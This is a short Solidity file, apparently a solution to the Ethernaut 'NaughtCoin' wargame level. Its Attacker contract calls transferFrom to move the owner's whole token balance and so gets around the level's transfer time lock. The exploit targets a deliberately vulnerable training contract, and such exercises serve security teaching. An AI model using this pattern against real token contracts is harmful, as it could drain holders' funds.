// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {NaughtCoin} from "ethernaut/levels/NaughtCoin.sol";

contract Attacker {
    NaughtCoin target;
    address owner;

    constructor(address _target) {
        owner = msg.sender;
        target = NaughtCoin(_target);
    }

    function transfer() external {
        target.transferFrom(owner, address(this), target.balanceOf(owner));
    }
}
